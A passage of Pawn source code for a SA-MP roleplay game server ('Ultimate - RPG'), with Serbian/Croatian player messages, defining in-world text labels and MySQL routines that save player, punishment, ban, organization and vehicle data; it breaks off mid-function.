    Create3DandP("(( ELECTRONIC SHOP ))\nDa pogledati listu za prodaju kucajte {FFFFFF}\"/buyelectric\"", 1019.4869, 2664.9915, -46.5000, -1, -1, 19423, 10.0);

	CreateDynamic3DTextLabel( "Bandera Srece\n{FFFFFF}/doniraj\n\nStanite ovde i gledajte banderu\nkada neko donira gradu\nobogaticete se, valjda.", 0x4282C0FF, 1133.5189, -936.0316, 46.0000, 20.0, IPI, IVI, 1, -1, -1 );

	Create3DandP( "{CCCCCC}(( TAJNI ULAZ ))\nUlaz za {FFFFFF}policiju.\n{CCCCCC}Za ulaz pritisnite tipku {FFFFFF}\"ENTER\"", 1462.0800,-1017.8565,48.1406, -1, -1, 1239, 10.0 );
    Create3DandP( "{CCCCCC}(( TAJNI PROLAZ ))\nZa izlaz pritisnite tipku {FFFFFF}\"ENTER\"", 1610.8090, -1047.8755, -31.2101, -1, -1, 1239, 10.0);
    Create3DandP( "{CCCCCC}(( TAJNI PROLAZ ))\n\nZa izlaz pritisnite tipku {FFFFFF}\"ENTER\"", 1605.0842, -1047.8739, -31.2101, -1, -1, 1239, 10.0);

    Create3DandP( "(( PADOBRAN ))\nZa kupovinu(2000$) kucajte {FFFFFF}\"/kupipadobran\"", 1544.2876, -1354.0452, 329.4731, -1, -1, 1310, 10.0 );
    Create3DandP( "{4282C0}(( ZGRADA ))\n{FFFFFF}\"ENTER\" {4282C0}za ulaz", 1573.0773, -1338.7637, 16.4844, -1, -1, 19133, 20.0 );
    Create3DandP( "{4282C0}(( ZGRADA ))\n{FFFFFF}\"ENTER\" {4282C0}za izlaz", 1548.4452,-1364.1462,326.2183, -1, -1, 19133, 20.0 );

    Create3DandP("(( CRNO TRZISTE ))\nDa kupite ilegalne stvari kucajte {FFFFFF}\"/crnotrziste\"", 197.0044, -232.2355, 1.7787, -1, -1, 1279, 3.0 );

	Create3DandP("(( BRAK ))\nDa zaprosite neku devojku kucajte {FFFFFF}\"/zaprosi\"", 309.0333,-1909.3862,1.5884, -1, -1, 19525, 10.0);

    Create3DandP("(( IGRAONICA ))\nDa zaigrate igricu upisite {FFFFFF}\"/igrice\"", 1292.3866,-1360.9969,35.8143, -1, 187, 19894, 10.0 );

	//

	Create3DandP(
		            "{4282C0}(U L T I M A T E  -  R P G)\n\
		            ~ VERZIJA MODA ~\n{FFFFFF}"VERZIJA_MODA" - "MODE_BUILD"\n\n\
		            {4282C0}~ VLASNIK ~\n{FFFFFF}Kristijan\n\n\
		            {4282C0}~ SKRIPTERI ~\n{FFFFFF}Saco x Ghetoven\n\n\
		            {4282C0}~ MAPPER ~\n{FFFFFF}Somika & Mashke\n\n\
		            {4282C0}~ FACEBOOK ~\n{FFFFFF}fb.com/UltimateCommunity\n\n\
		            {4282C0}~ INTAGRAM ~\n{FFFFFF}@ultimate_rpg\n\n\
		            {4282C0}~ WEB PORTAL ~\n{FFFFFF}"SERVER_WEB"\n\n\
		            {4282C0}~ CREDITS ~\n{FFFFFF}.mumitza\n\n\
		            {4282C0}(c) 2018 {FFFFFF}www.ultimate-rpg.com {4282C0}All rights reserved (c)", 1580.6173, -2304.7217, 14.5066, -1, -1, 18749, 10.0);
}

//------------------------------------------------------------------------------

SendAltChatMessage(playerid, const message[])
{
	for(new i = 0; i < MAX_LINES; i ++) 
	{
	    if (i == MAX_LINES - 1) 
		{
	        strmid(AltChatTD_Text[playerid][i], message, 0, strlen(message));
	        break;
	    }
		strmid(AltChatTD_Text[playerid][i], AltChatTD_Text[playerid][i + 1], 0, strlen(AltChatTD_Text[playerid][i + 1]));
	}

	for(new i = 0; i < MAX_LINES; i ++) 
	{
	    PlayerTextDrawSetString(playerid, AltChatTD_Player[i], AltChatTD_Text[playerid][i]);
	    PlayerTextDrawShow(playerid, AltChatTD_Player[i]);
	}
	return 1;
}

//------------------------------------------------------------------------------

_:public Mysql_Connect()
{
	mSQL = mysql_connect( MYSQL_HOST, MYSQL_USER, MYSQL_DB, MYSQL_PASS, 3306, true, 4 );

	if( mysql_errno( mSQL ) != 0 )
	{
		printf("(U) SQL: Failed connection to %s@%s -> %s", MYSQL_USER, MYSQL_HOST, MYSQL_DB);
		SendRconCommand("password mysqlfuckedup!");
		return 1;
	}
	else
	{
		printf("(U) SQL: Successed connection to %s@%s -> %s", MYSQL_USER, MYSQL_HOST, MYSQL_DB);
		return 1;
	}
}

_:public sql_user_update_disc(playerid) 
{
	new playersip[ 22 ];
    GetPlayerIp( playerid, playersip, sizeof( playersip ) );

    new query[600];
    mysql_format( mSQL, query, sizeof( query ), "UPDATE `users` SET `isonline` = '0', `payday` = '%d', `user_ip` = '%e'", PlayerInfo[ playerid ][ xPayDay ], playersip );
    mysql_format( mSQL, query, sizeof( query ), "%s, `phone_credit` = '%d', `jail_type` = '%d', `jail_time` = '%d'", query, PlayerInfo[ playerid ][ xTelefonBon ], PlayerInfo[ playerid ][ xZatvor ], PlayerInfo[ playerid ][ xZatvorVreme ] );
	mysql_format( mSQL, query, sizeof( query ), "%s, `mute` = '%d', `staff_min` = '%d', `last_login` = NOW()", query, PlayerInfo[ playerid ][ xMute ], PlayerInfo[ playerid ][ xStaffMin ] );
	mysql_format( mSQL, query, sizeof( query ), "%s, `rob_time` = '%d', `hangar_time` = '%d', `taking_time` = '%d', `mats_smugl` = '%d', `robp_time` = '%d' WHERE `user_id` = '%d' LIMIT 1",

	    query, PlayerInfo[ playerid ][ xPljackaVreme ], PlayerInfo[ playerid ][ xHangarTime ],
        PlayerInfo[ playerid ][ xZauzimanjeVreme ], PlayerInfo[ playerid ][ xSvercer ], PlayerInfo[ playerid ][ xRobVreme ], PlayerInfo[ playerid ][ xID ] );

    mysql_tquery( mSQL, query);
	return 1;
}

_:public sql_user_update( playerid )
{
    new query[ 1024 ];
    mysql_format( mSQL, query, sizeof( query ), "UPDATE `users` SET `level` = '%d', `exp` = '%d', `upgrades` = '%d', `payday` = '%d', `skin_id` = '%d', `spawn` = '%d'",
        PlayerInfo[ playerid ][ xLevel ], PlayerInfo[ playerid ][ xRespekt ], PlayerInfo[ playerid ][ xPoboljsanja ],
		PlayerInfo[ playerid ][ xPayDay ], PlayerInfo[ playerid ][ xSkin ], PlayerInfo[ playerid ][ xSpawn ] );

    mysql_format( mSQL, query, sizeof( query ), "%s, `property_id_1` = '%d', `property_id_2` = '%d', `property_id_3` = '%d'",
		query, PlayerInfo[ playerid ][ xPropertySqlID ][ 0 ], PlayerInfo[ playerid ][ xPropertySqlID ][ 1 ], PlayerInfo[ playerid ][ xPropertySqlID ][ 2 ] );

    mysql_format( mSQL, query, sizeof( query ), "%s, `phone_credit` = '%d', `jail_type` = '%d', `jail_time` = '%d', `xBRacun` = '%d', `credit_rest` = '%d', `credit_amount` = '%d', `credit_installment` = '%d'",
	    query, PlayerInfo[ playerid ][ xTelefonBon ], PlayerInfo[ playerid ][ xZatvor ], PlayerInfo[ playerid ][ xZatvorVreme ],
		PlayerInfo[ playerid ][ xBRacun ], PlayerInfo[ playerid ][ xPreostaloZaOtplatu ], PlayerInfo[ playerid ][ xIznosKredita ], PlayerInfo[ playerid ][ xIznosRate ] );

	mysql_format( mSQL, query, sizeof( query ), "%s, `xOnlineSati` = '%d', `mute` = '%d', `org_contract` = '%d', `vip_level` = '%d', `promoter_level`='%d', `xYouTuber`='%d', `org_punishment` = '%d', `staff_min` = '%d'",
	    query, PlayerInfo[ playerid ][ xOnlineSati ], PlayerInfo[ playerid ][ xMute ], PlayerInfo[ playerid ][ xOrgUgovor ],
		PlayerInfo[ playerid ][ xVIPLevel ], PlayerInfo[playerid][xPromoter], PlayerInfo[playerid][xYouTuber], PlayerInfo[ playerid ][ xKazneniUgovor ], PlayerInfo[ playerid ][ xStaffMin ] );

	mysql_format( mSQL, query, sizeof( query ), "%s, `rent_id` = '%d', `vip_time` = '%f', `xTDColor` = '%d' WHERE `user_id` = '%d' LIMIT 1",
	    query, PlayerInfo[ playerid ][ xRentID ], PlayerInfo[ playerid ][ xVipTime ], PlayerInfo[ playerid ][ xTDColor ],
		PlayerInfo[ playerid ][ xID ] );

    mysql_tquery( mSQL, query);

	return 1;
}

_:public sql_user_update_property( playerid ) 
{
	new q[ 256 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `property_id_1` = '%d', `property_id_2` = '%d', `property_id_3` = '%d' WHERE `user_id` = '%d'", PlayerInfo[ playerid ][ xPropertySqlID ][ 0 ], PlayerInfo[ playerid ][ xPropertySqlID ][ 1 ], PlayerInfo[ playerid ][ xPropertySqlID ][ 2 ], PlayerInfo[ playerid ][ xID ] );
    mysql_tquery( mSQL, q);
	return 1;
}

_:public sql_user_update_org_variables( playerid ) {

	new q[ 512 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `skin_id` = '%d', `spawn` = '%d', `org_contract` = '%d', `org_punishment` = '%d' WHERE `user_id` = '%d'",
		PlayerInfo[ playerid ][ xSkin ],
		PlayerInfo[ playerid ][ xSpawn ],
		PlayerInfo[ playerid ][ xOrgUgovor ],
		PlayerInfo[ playerid ][ xKazneniUgovor ],
		PlayerInfo[ playerid ][ xID ] );

	mysql_tquery( mSQL, q);
	return 1;
}

_:public sql_user_update_time_variables( playerid ) {

	new q[ 512 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `mats_smugl` = '%d', `taking_time` = '%d', `rob_time` = '%d', `hangar_time` = '%d', `staff_min` = '%d', `org_contract` = '%d', `phone_credit` = '%d', `mute` = '%d', `robp_time` = '%d' WHERE `user_id` = '%d'",
		PlayerInfo[ playerid ][ xSvercer ],
		PlayerInfo[ playerid ][ xZauzimanjeVreme ],
		PlayerInfo[ playerid ][ xPljackaVreme ],
		PlayerInfo[ playerid ][ xHangarTime ],
		PlayerInfo[ playerid ][ xStaffMin ],
		PlayerInfo[ playerid ][ xOrgUgovor ],
		PlayerInfo[ playerid ][ xTelefonBon ],
		PlayerInfo[ playerid ][ xMute ],
		PlayerInfo[ playerid ][ xRobVreme ],
		PlayerInfo[ playerid ][ xID ] );

	mysql_tquery( mSQL, q);
	return 1;
}

_:public sql_user_update_integer( playerid, field[], value ) {

	new q[ 128 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `%s` = '%d' WHERE `user_id` = '%d'", field, value, PlayerInfo[ playerid ][ xID ] );
    mysql_tquery( mSQL, q);
	return 1;
}

_:public sql_user_update_string(playerid, field[], val[]) {

	new q[ 128 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `%s` = '%e' WHERE `user_id` = '%d'", field, val, PlayerInfo[ playerid ][ xID ] );
    mysql_tquery( mSQL, q);
	return 1;
}

_:public sql_user_update_float(playerid, field[], Float: val) {

	new q[128];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `%s` = '%f' WHERE `user_id` = '%d'", field, val, PlayerInfo[ playerid ][ xID ] );
    mysql_tquery( mSQL, q);
	return 1;
}

_:public sql_user_update_clothes( playerid )
{
    new query[ 2048 ];
    mysql_format( mSQL, query, sizeof( query ), "UPDATE `user_clothes` SET `cloth_slot_1` = '%d', `cloth_slot_1_p1` = '%f', `cloth_slot_1_p2` = '%f', `cloth_slot_1_p3` = '%f', `cloth_slot_1_p4` = '%f', `cloth_slot_1_p5` = '%f', `cloth_slot_1_p6` = '%f', `cloth_slot_1_p7` = '%f', `cloth_slot_1_p8` = '%f', `cloth_slot_1_p9` = '%f'",
	        clothes_info[ playerid ][ x_slot_1_model ], clothes_info[ playerid ][ x_slot_1_pos ][ 0 ], clothes_info[ playerid ][ x_slot_1_pos ][ 1 ],
			clothes_info[ playerid ][ x_slot_1_pos ][ 2 ], clothes_info[ playerid ][ x_slot_1_pos ][ 3 ], clothes_info[ playerid ][ x_slot_1_pos ][ 4 ],
			clothes_info[ playerid ][ x_slot_1_pos ][ 5 ], clothes_info[ playerid ][ x_slot_1_pos ][ 6 ], clothes_info[ playerid ][ x_slot_1_pos ][ 7 ],
			clothes_info[ playerid ][ x_slot_1_pos ][ 8 ] );

	mysql_format( mSQL, query, sizeof( query ), "%s, `cloth_slot_2` = '%d', `cloth_slot_2_p1` = '%f', `cloth_slot_2_p2` = '%f', `cloth_slot_2_p3` = '%f', `cloth_slot_2_p4` = '%f', `cloth_slot_2_p5` = '%f', `cloth_slot_2_p6` = '%f', `cloth_slot_2_p7` = '%f', `cloth_slot_2_p8` = '%f', `cloth_slot_2_p9` = '%f'",
	        query, clothes_info[ playerid ][ x_slot_2_model ], clothes_info[ playerid ][ x_slot_2_pos ][ 0 ], clothes_info[ playerid ][ x_slot_2_pos ][ 1 ],
			clothes_info[ playerid ][ x_slot_2_pos ][ 2 ], clothes_info[ playerid ][ x_slot_2_pos ][ 3 ], clothes_info[ playerid ][ x_slot_2_pos ][ 4 ],
			clothes_info[ playerid ][ x_slot_2_pos ][ 5 ], clothes_info[ playerid ][ x_slot_2_pos ][ 6 ], clothes_info[ playerid ][ x_slot_2_pos ][ 7 ],
			clothes_info[ playerid ][ x_slot_2_pos ][ 8 ] );

    mysql_format( mSQL, query, sizeof( query ), "%s, `cloth_slot_3` = '%d', `cloth_slot_3_p1` = '%f', `cloth_slot_3_p2` = '%f', `cloth_slot_3_p3` = '%f', `cloth_slot_3_p4` = '%f', `cloth_slot_3_p5` = '%f', `cloth_slot_3_p6` = '%f', `cloth_slot_3_p7` = '%f', `cloth_slot_3_p8` = '%f', `cloth_slot_3_p9` = '%f'",
	        query, clothes_info[ playerid ][ x_slot_3_model ], clothes_info[ playerid ][ x_slot_3_pos ][ 0 ], clothes_info[ playerid ][ x_slot_3_pos ][ 1 ],
			clothes_info[ playerid ][ x_slot_3_pos ][ 2 ], clothes_info[ playerid ][ x_slot_3_pos ][ 3 ], clothes_info[ playerid ][ x_slot_3_pos ][ 4 ],
			clothes_info[ playerid ][ x_slot_3_pos ][ 5 ], clothes_info[ playerid ][ x_slot_3_pos ][ 6 ], clothes_info[ playerid ][ x_slot_3_pos ][ 7 ],
			clothes_info[ playerid ][ x_slot_3_pos ][ 8 ] );

    mysql_format( mSQL, query, sizeof( query ), "%s, `cloth_slot_4` = '%d', `cloth_slot_4_p1` = '%f', `cloth_slot_4_p2` = '%f', `cloth_slot_4_p3` = '%f', `cloth_slot_4_p4` = '%f', `cloth_slot_4_p5` = '%f', `cloth_slot_4_p6` = '%f', `cloth_slot_4_p7` = '%f', `cloth_slot_4_p8` = '%f', `cloth_slot_4_p9` = '%f' WHERE `user_id` = '%d' LIMIT 1",
	        query, clothes_info[ playerid ][ x_slot_4_model ], clothes_info[ playerid ][ x_slot_4_pos ][ 0 ], clothes_info[ playerid ][ x_slot_4_pos ][ 1 ],
			clothes_info[ playerid ][ x_slot_4_pos ][ 2 ], clothes_info[ playerid ][ x_slot_4_pos ][ 3 ], clothes_info[ playerid ][ x_slot_4_pos ][ 4 ],
			clothes_info[ playerid ][ x_slot_4_pos ][ 5 ], clothes_info[ playerid ][ x_slot_4_pos ][ 6 ], clothes_info[ playerid ][ x_slot_4_pos ][ 7 ],
			clothes_info[ playerid ][ x_slot_4_pos ][ 8 ], PlayerInfo[ playerid ][ xID ] );

    mysql_tquery(mSQL, query);
	return 1;
}

_:public selectPunishmentsbyName( playerid, player_name[] )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows )
	{
        SendErrorMessage( playerid, "Ovaj igrac nije kaznjavan ili ne postoji u bazi podataka." );
    }
    else
	{
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
        strcat( DialogStrgEx, "{FFFFFF}Lista kazni:\n\n" );
        new P_Counter = 0, string_sz[ 128 ];

        for( new i = 0; i < rows; i ++ ) {

			format( string_sz, sizeof( string_sz ), "%d. Punishment ID - %d\n", P_Counter+1, cache_get_field_content_int( i, "p_id" ) );
            strcat( DialogStrgEx, string_sz );
            P_Counter++;
        }
        if( P_Counter == 0 ) return SendErrorMessage( playerid, "Ovaj igrac nije kaznjavan!" );
        strcat( DialogStrgEx, "\n\n\n" );
        strcat( DialogStrgEx, "Ukoliko zelite da proverite posebno kazne (/proverikaznu (id kazne))." );

        new d_naslov[ 64 ];
		format( d_naslov, sizeof( d_naslov ), "{FFFFFF}%s je kaznjen {4282C0}%d {FFFFFF}puta.", player_name, P_Counter );
        ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, d_naslov, DialogStrgEx, "U redu", "" );

        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    }
	return 1;
}

_:public selectPunishmentbyID( playerid, punishment_id )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows )
	{
        SendErrorMessage( playerid, "Kazna ID %d, ne postoji u bazi podataka.", punishment_id );
    }
    else
	{
        new p_jail_min		= 	cache_get_field_content_int(0, "p_jail_min");
	    new p_money_fine	= 	cache_get_field_content_int(0, "p_money_fine");

		new p_reason[ 64 ];
		cache_get_field_content( 0, "p_reason", p_reason, mSQL, 64 );

		new admin_name[ MAX_PLAYER_NAME ];
		cache_get_field_content( 0, "admin_name", admin_name, mSQL, MAX_PLAYER_NAME );

		new kaznjen[ MAX_PLAYER_NAME ];
		cache_get_field_content( 0, "kaznjen", kaznjen, mSQL, MAX_PLAYER_NAME );

        new d_naslov[ 64 ];
		format( d_naslov, sizeof( d_naslov ), "{FFFFFF}Punishment {4282C0}#%d", punishment_id );

	    strdel( sDStrg, 0, sizeof( sDStrg ));

	    format( sDStrg, sizeof( sDStrg ), "{FFFFFF}Kaznjeni igrac: %s.\nAdministrator: %s.\nRazlog: %s.\nFine: %d.\nJail: %dmin.",
			kaznjen,
			admin_name,
			p_reason,
			p_money_fine,
			p_jail_min );

		ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, d_naslov, sDStrg, "U redu", "" );
	    strdel( sDStrg, 0, sizeof( sDStrg ));

    }
	return 1;
}

_:public sql_create_punishment( playerid, admin_id, const reason[], jail_time, money_fine, warns )
{
	if( jail_time != 0 )
	{
	    JailPlayer( playerid, jail_time );
	}

	if( money_fine != 0 )
	{
	    DajIgracuNovac( playerid, -money_fine );
	}

	if( warns != 0 )
	{
		PlayerInfo[playerid][xWarn] += warns;
		sql_user_update_integer(playerid, "warn", PlayerInfo[playerid][xWarn]);
	}

	new query[ 220 ];
	mysql_format( mSQL, query, sizeof( query ),
												"INSERT INTO `punishments` (p_user_id, p_admin, p_reason, p_jail_min, p_money_fine) VALUES('%d', '%d', '%e', '%d', '%d')",
													PlayerInfo[ playerid ][ xID ], PlayerInfo[ admin_id ][ xID ], reason, jail_time, money_fine );

	mysql_tquery( mSQL, query, "OnPunishmentCreated", "isiiii", playerid, reason, jail_time, money_fine, admin_id, warns );
	return 1;
}

_:public OnPunishmentCreated( playerid, const reason[], jail_time, money_fine, admin_id, warns )
{
    new punishment_id = cache_insert_id();

	new d_naslov[ 64 ];
	format( d_naslov, sizeof( d_naslov ), "{FFFFFF}Punishment {4282C0}#%d", punishment_id );

    strdel( sDStrg, 0, sizeof( sDStrg ));
    format( sDStrg, sizeof( sDStrg ), DialogTekstovi[ 3 ], reason, money_fine, jail_time, warns );
	ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, d_naslov, sDStrg, "U redu", "" );
    strdel( sDStrg, 0, sizeof( sDStrg ));

    AdminMsg( ADM_WARN, "[ADMIN] %s je kaznje%s od Admina %s, razlog: %s", ImeIgraca( playerid ), getPolForString(playerid, "n", "na"), ImeIgraca( admin_id ), reason );
	SendClientMessageToAllEx( 0xFF4500FF, "#PUNISHMENT: {FFFFFF}Admin je kaznio igraca {FF4500}%s. {FFFFFF}Razlog: {FF4500}%s", ImeIgraca( playerid ), reason );

	if( PlayerInfo[ playerid ][ xWarn ] >= 5 )
	{
		AdminMsg( ADM_WARN, "[ADMIN] %s je dobi%s ban od Admina %s, razlog: 5/5 upozorenja(/pp).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( admin_id ) );

		sql_ban_user( ImeIgraca( playerid ), PlayerInfo[ playerid ][ xID ], 1, "Warn 5/5", ImeIgraca( admin_id ));
	    Kickovanje( playerid, "Ti si banovan sa servera. Unban zatrazi na forumu: {FF0000}"SERVER_WEB"");

        ServerInfo[ BanovanihKorisnika ]++;
	}
    return 1;
}

_:public sql_create_account( playerid )
{
	new query[ 512 ], playersip[ 22 ];
	GetPlayerIp( playerid, playersip, sizeof( playersip ) );

	mysql_format( mSQL, query, sizeof( query ),
		"INSERT INTO `users` (p_name, password, registered, isonline, sex, age, money, level, skin_id, spawn, user_ip, country, email, last_login, reg_date) \
		VALUES('%e', '%e', '%d', '1', '%d', '%d', '%d', '%d', '%d', '%d', '%e', '%d', '%e', NOW(), NOW())",

				ImeIgraca( playerid ), PlayerInfo[ playerid ][ xLozinka ], PlayerInfo[ playerid ][ xRegistrovan ], PlayerInfo[ playerid ][ xPol ], PlayerInfo[ playerid ][ xGodine ],
		        PlayerInfo[ playerid ][ xNovac ], PlayerInfo[ playerid ][ xLevel ], PlayerInfo[ playerid ][ xSkin ], PlayerInfo[ playerid ][ xSpawn ],
		        playersip, PlayerInfo[ playerid ][ xDrzava ], PlayerInfo[ playerid ][ xMail ] );

	mysql_tquery( mSQL, query, "OnAccountRegister", "i", playerid);
	return 1;
}

_:public OnAccountRegister( playerid )
{
	PlayerInfo[ playerid ][ xID ] = cache_insert_id();

    TogglePlayerSpectating( playerid, true );
	SMG_SetPlayerSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
	SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );

    InterpolateCameraPos( playerid, 1677.1746, -1303.1085, 481.0584, 1452.0430, -1314.4868, 176.0983, 50000, CAMERA_MOVE);
	InterpolateCameraLookAt( playerid, 1676.1766, -1312.1057, 479.6893, 1451.0450, -1314.4979, 174.7492, 50000, CAMERA_MOVE);
	SetPlayerInterior( playerid, 0 );
	SetPlayerVirtualWorld( playerid, 1 );
	SMG_SetPlayerPos( playerid, 1463.7633,-1041.4501,26.8281);

	SetPlayerTimerEx(playerid, "Player_OneSecond", 1000, true, "i", playerid);

	// ---

	StopAudioStreamForPlayer(playerid);

  	TogglePlayerSpectating(playerid, false);
	PlayerLogged[playerid] = true;
	sql_user_update_integer(playerid, "isonline", 1);
  	clothes_load[playerid] = true;
  	quests_load[playerid] = true;
  	skills_load[playerid] = true;
	TogPlayerHud(playerid);
    ServerInfo[RegistrovanihKorisnika]++;
    SaveServerStats();
    
 	BuildIngameTextDraws(playerid, true);

	SetPlayerTDStats(playerid);
	ResetPlayerWeapons(playerid);
 	SetCameraBehindPlayer(playerid);
	SMG_TogglePlayerControllable(playerid, true);
	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);
	SMG_SetSpawnInfo(playerid);
	SpawnPlayer(playerid);

	new playersip[22];
   	GetPlayerIp(playerid, playersip, sizeof(playersip));

   	sql_user_update_disc(playerid);

    SendClientMessage(playerid, -1, "(U): Uspjesno ste se registrirali na {4282C0}Ultimate - RPG {FFFFFF}server te vam zelimo dobrodoslicu.");
    ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogTekstovi[2], "U redu", "");

	DodajWarnRed("~b~#REG: %s(%d) ~w~se upravo registrova%s na server.", ImeIgraca(playerid), playerid, PlayerInfo[playerid][xPol] ? "o" : "la");

	#if XMAS_MOD == 1

		SendClientMessage( playerid, 0x4282C0FF, "(U): Zelimo svima srecne Bozicne i novogodisnje praznike - Happy New Year *** 2020 ***");
	
	#endif

	#if ZIMSKI_MOD == 1

		SendClientMessage(playerid, 0x4282C0FF, "(U): Uzivajte u zimskoj idili, upisite {FFFFFF}\"/sneg\"");

	#endif
	return 1;
}

_:public sql_user_unban( user_id )
{
    new query[ 128 ];
	mysql_format( mSQL, query, sizeof( query ), "DELETE FROM `banned` WHERE `user_id` = '%d'", user_id );
	mysql_tquery( mSQL, query);
    return 1;
}

_:public sql_org_member_delete( org_id, membsqlID )
{
    new query[ 128 ];
	mysql_format( mSQL, query, sizeof( query ), "DELETE FROM `org_members` WHERE `org_id` = '%d' AND `memb_sqlID` = '%d'", org_id, membsqlID  );
	mysql_tquery( mSQL, query);
    return 1;
}

_:public sql_org_member_inser( org_id, type, playerid )
{
    new query[ 256 ];
	mysql_format( mSQL, query, sizeof( query ), "INSERT INTO `org_members` (org_id, memb_rank, memb_type, memb_sqlID) VALUES('%d', '%d', '%d', '%d')", org_id, PlayerInfo[ playerid ][ xRank ], type, PlayerInfo[ playerid ][ xID ] );
	mysql_tquery( mSQL, query);
    return 1;
}

sql_ban_user( const user_name[], user_id, ban_type, const ban_reason[], const admin_name[], ban_time = 0 )
{
    new query[ 512 ], ban_date[ 64 ], tmphour, tmpminute, tmpsecond, year, month,day;
	if( ban_type == 1 )
	{
		getdate( year, month, day );
		gettimeEx( tmphour, tmpminute, tmpsecond );
		FixHour( tmphour );
		tmphour = shifthour;
		format( ban_date, sizeof( ban_date ), "%02d/%02d/%d - %d/%d/%d", day, month, year, tmphour, tmpminute, tmpsecond );

		mysql_format( mSQL, query, sizeof( query ), "INSERT INTO `banned` (user_id, ban_type, ban_reason, ban_admin, ban_date, user_name) VALUES('%d', '%d', '%e', '%e', '%e', '%e')",
			user_id, ban_type, ban_reason, admin_name, ban_date, user_name );

		mysql_tquery( mSQL, query);
	}
	else if( ban_type == 2 )
	{
		getdate( year, month, day );
		gettimeEx( tmphour, tmpminute, tmpsecond );
		FixHour( tmphour );
		tmphour = shifthour;
		format( ban_date, sizeof( ban_date ), "%02d/%02d/%d - %d/%d/%d", day, month, year, tmphour, tmpminute, tmpsecond );

		mysql_format( mSQL, query, sizeof( query ), "INSERT INTO `banned` (user_id, ban_type, ban_reason, ban_admin, ban_date, user_name, ban_time) VALUES('%d', '%d', '%e', '%e', '%e', '%e', '%d')",
			user_id, ban_type, ban_reason, admin_name, ban_date, user_name, ban_time );

		mysql_tquery( mSQL, query);
	}
	return 1;
}

_:public sql_organization_update_integer( OrgID, field[], value )
{
	new q[ 128 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `%s` = '%d' WHERE `org_id` = '%d'", field, value, org_info[ OrgID ][ oID ] );
    mysql_tquery( mSQL, q );
	return 1;
}

_:public sql_organization_update_drugs( OrgID )
{
	new q[ 120 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `safe_drug_amount` = '%d' WHERE `org_id` = '%d'", org_info[ OrgID ][ oSafeDrugAmmount ], org_info[ OrgID ][ oID ] );
    mysql_tquery( mSQL, q);
	return 1;
}

_:public sql_organization_update_string( OrgID, field[], value[] ) {

	new q[ 128 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `%s` = '%e' WHERE `org_id` = '%d'", field, value, org_info[ OrgID ][ oID ] );
    mysql_tquery( mSQL, q );
	return 1;
}

_:public sql_vehicles_delete( vehicleid )
{
	new query[ 128 ];
	mysql_format( mSQL, query, sizeof( query ), "DELETE FROM `vehicles` WHERE `veh_id` = '%d'", VehicleInfo[ vehicleid ][ vSqlID ] );
	mysql_tquery( mSQL, query);
    return 1;
}

_:public sql_vehicles_update_tuning( vehicleid )
{
	new q[ 512 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_tuned` = '%d', `v_spoiler` = '%d', `v_hood` = '%d', `v_roof` = '%d', `v_skirt` = '%d', `v_lamps` = '%d', `v_nitro` = '%d', `v_exhaust` = '%d', `v_wheels` = '%d', `v_stereo` = '%d', `v_hydraulics` = '%d', `v_front_bumper` = '%d', `v_rear_bumper` = '%d', `v_vents` = '%d', `v_paintjob` = '%d' WHERE `veh_id` = '%d' LIMIT 1",

 							VehicleInfo[ vehicleid ][ vTuned ],
						    VehicleInfo[ vehicleid ][ vSpoiler ],
						    VehicleInfo[ vehicleid ][ vHood ],
						    VehicleInfo[ vehicleid ][ vRoof ],
						    VehicleInfo[ vehicleid ][ vSkirt ],
						    VehicleInfo[ vehicleid ][ vLamps ],
						    VehicleInfo[ vehicleid ][ vNitro ],
						    VehicleInfo[ vehicleid ][ vExhaust ],
						    VehicleInfo[ vehicleid ][ vWheels ],
						    VehicleInfo[ vehicleid ][ vStereo ],
						    VehicleInfo[ vehicleid ][ vHydraulics ],
						    VehicleInfo[ vehicleid ][ vFrontBumper ],
						    VehicleInfo[ vehicleid ][ vRearBumper ],
						    VehicleInfo[ vehicleid ][ vVents ],
						    VehicleInfo[ vehicleid ][ vPaintJob ],
							VehicleInfo[ vehicleid ][ vSqlID ] );

	mysql_tquery( mSQL, q );
    return 1;
}

sql_create_vehicle( veh_model, veh_usage, veh_org = -1, Float:veh_pos_x, Float:veh_pos_y, Float:veh_pos_z, Float:veh_pos_a, veh_col_1, veh_col_2 )
{
	if( veh_model < 400 || veh_model > 611 ) return 1;

	new i = IVI;

    i = SMG_CreateVehicle( veh_model, veh_pos_x, veh_pos_y, veh_pos_z+1.0, veh_pos_a, veh_col_1, veh_col_2, 300000 );

	if( i == IVI ) return 1;

	VehicleInfo[ i ][ vSqlID ] = 0;
	VehicleInfo[ i ][ vOwner_sqlID ] = 0;
	VehicleInfo[ i ][ vKilometri ] = 0;
	VehicleInfo[ i ][ vMetri ] = 0;
	VehicleInfo[ i ][ vPrice ] = VehPrice[ veh_model-400 ][ 1 ];
	strmid( VehicleInfo[ i ][ vOwner ], "Drzava", 0, strlen("Drzava"), 32);
	VehicleInfo[ i ][ vLocked ] = 0;
	VehicleInfo[ i ][ vLokacijaX ] = veh_pos_x;
	VehicleInfo[ i ][ vLokacijaY ] = veh_pos_y;
	VehicleInfo[ i ][ vLokacijaZ ] = veh_pos_z;
	VehicleInfo[ i ][ vLokacijaA ] = veh_pos_a;
